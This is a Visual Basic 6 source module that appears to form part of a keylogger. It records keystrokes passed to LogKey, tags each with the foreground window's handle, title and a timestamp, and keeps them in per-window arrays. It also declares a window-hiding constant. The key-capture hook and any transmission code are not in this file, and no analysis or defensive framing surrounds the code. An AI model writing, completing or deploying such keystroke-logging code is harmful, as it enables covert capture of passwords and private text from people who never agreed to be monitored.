Attribute VB_Name = "modWindow"
Option Explicit

Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Public Declare Function GetForegroundWindow Lib "user32" () As Long
Public Declare Function SetForegroundWindow Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Public Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long

Public Const SW_HIDE = 0 ' hide window
Public Const SW_NORMAL = 1 'show window in normal mode
Public LoggedWindowCount As Integer
Private currentWorkingWndHndl As Long
Public wndLMT() As String
Public wndHndl() As Long
Public wndTitle() As String
Public wndKeys() As String

Public Function GetLoggedHandle(ByVal index As Integer) As Long
GetLoggedHandle = wndHndl(index)
End Function

Public Function GetLoggedTitle(ByVal index As Integer) As String
GetLoggedTitle = wndTitle(index)
End Function

Public Function GetLoggedKeys(ByVal index As Integer) As String
GetLoggedKeys = wndKeys(index)
End Function

Public Function GetLMT(ByVal index As Integer) As String
GetLMT = wndLMT(index)
End Function

Public Function GetCaption(hwnd As Long) As String
    Dim hWndTitle As String, hWndlength As Long
    hWndlength = GetWindowTextLength(hwnd)
    hWndTitle = String(hWndlength, 0)
    GetWindowText hwnd, hWndTitle, (hWndlength + 1)
    GetCaption = hWndTitle
End Function

Public Function GetWorkingWindow() As Long
GetWorkingWindow = GetForegroundWindow
End Function

Public Sub LogWindows(ByVal winLMT As String, ByVal winHndl As Long, ByVal winTitle As String, ByVal winKey As String)
    Dim i As Integer, entryFound As Boolean
    'On Error Resume Next
    'search for hndl entry..if found, compare title informations and apend key
    If LoggedWindowCount > 0 Then
        For i = 0 To UBound(wndHndl)
            DoEvents
            If wndHndl(i) = winHndl Then
                'compare titles
                entryFound = True
                If wndTitle(i) <> winTitle Then
                    'log change to title
                    wndTitle(i) = winTitle
                End If
                wndLMT(i) = winLMT
                'append key value to wndKeys array entry
                If Not winKey = Chr(vbNull) Then
                    wndKeys(i) = wndKeys(i) & winKey
                End If
            End If
        Next
    End If
    DoEvents
    If Not entryFound Then
        'create new entries
        Dim index As Integer
        index = LoggedWindowCount
        ReDim Preserve wndHndl(index)
        wndHndl(index) = winHndl
        ReDim Preserve wndTitle(index)
        wndTitle(index) = winTitle
        ReDim Preserve wndKeys(index)
        If Not winKey = Chr(vbNull) Then
            wndKeys(index) = winKey
        End If
        ReDim Preserve wndLMT(index)
        wndLMT(index) = winLMT
        LoggedWindowCount = LoggedWindowCount + 1
    End If
End Sub

Public Sub LogKey(ByVal KeyChar)
If KeyChar <> Chr(vbNull) Then
Dim hndl As Long
hndl = GetForegroundWindow
Call LogWindows(CStr(Now), CStr(hndl), GetCaption(hndl), KeyChar)
End If
End Sub
